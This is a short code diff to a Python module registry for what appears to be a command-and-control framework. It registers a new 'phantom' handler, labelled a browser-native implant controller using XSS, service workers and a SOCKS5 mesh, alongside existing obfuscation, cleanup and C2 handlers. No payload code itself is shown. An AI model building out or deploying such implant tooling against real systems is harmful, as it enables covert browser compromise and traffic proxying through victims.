@@ -35,6 +35,11 @@ from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Any, Callable, Dict, List, Optional
 
+# Add project root to Python path for imports
+PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
+if PROJECT_ROOT not in sys.path:
+    sys.path.insert(0, PROJECT_ROOT)
+
 
 # ============================================================
 # MODULE REGISTRY
@@ -519,6 +524,12 @@ def cleanup_handler(params: dict):
 def obfuscate_handler(params: dict):
     from modules.bridge.handlers.attacks import run_obfuscate
     return run_obfuscate(params)
+
+
+@registry.register("phantom", "PhantomWeb — browser-native implant controller (XSS, SW, mesh, SOCKS5)", "1.0", "delivery")
+def phantom_handler(params: dict):
+    from modules.phantom.controller import handle_phantom
+    return handle_phantom(params)
 
 
 @registry.register("health", "Health check and module listing", "1.0", "c2")
